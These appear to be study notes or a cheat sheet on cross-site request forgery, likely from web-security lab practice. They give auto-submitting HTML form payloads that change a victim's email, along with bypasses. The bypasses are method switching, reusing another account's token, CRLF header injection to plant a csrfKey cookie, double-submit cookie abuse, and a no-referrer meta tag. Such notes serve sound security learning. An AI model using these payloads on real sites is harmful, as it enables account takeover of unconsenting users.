# Updating someone's email via CSRF
- We can host another HTML page from the server and access it via the target (if we're allowed to do that) and the HTML page will make a malicious request.
```HTML
<form method="POST" action="https://target-url/endpoint">
	<input type="hidden" name="param-name" value="param-value">
</form>
<script>
	document.forms[0].submit();
</script>
```
- This will send a post request to change the viewer's email address everytime someone visits that page.
## Certain methods are blocked
- In some cases some methods are blocked and others aren't so try with other request methods 
```HTML
<form method="POST/GET/PUT/DELETE" action="https://target-url/endpoint">
	<input type="hidden" name="param-name" value="param-value">
</form>
<script>
	document.forms[0].submit();
</script>
```
## CSRF tokens are not tied to user sessions
- Sometimes CSRF token of one account can be used for other accounts, in such situations simply grab the csrf tokens of that account by logging into it. There maybe one as a hidden input field inside a form.
```HTML
<form method="POST" action="https://target-url/endpoint">
	<input type="hidden" name="param-name" value="param-value">
	<input type="hidden" name="csrf" value="csrf-token">
</form>
<script>
	document.forms[0].submit();
</script>
```
## CSRF Tokens are tied to non-session cookie
- /?search=test%0d%0aSet-Cookie:%20csrfKey=your-key
	- to inject the obtained key into current session
- So what after some trial and error, it was clear that csrf token had nothing to do with the "session" cookie, it was validated with the csrfKey
- Which means if we are to use the csrf token of another account then we must use the "csrfKey" of that account too for that we'll use header injection from the saerch bar. 
```HTML
<img src="https://target.com/?search=something%0d%0aSet-Cookie:%20csrfKey=csrf-key" onerror="document.forms[0].submit()">
```
- NOw the csrf token will work
## CSRF token is duplicated in cookie
- If the CSRF token passed as a hidden form parameter and the same value is copied into the Cookie headers (double submit technique), then it can be easily exploited by modifying the previous exploit
- First we can set a value for the csrf "cookie" via header injection and then we can pass the same value in the hidden field parameter
## Referer header blocks CSRF requests
![](Pasted%20image%2020220219111554.png)
- The Referrer Policy header blocks cross domain requests, removing it will allow those requests to pass through.
- To make sure we don't have that header set in our request, include this in the payload
```HTML
<meta name="referrer" content="no-referrer">
```
## 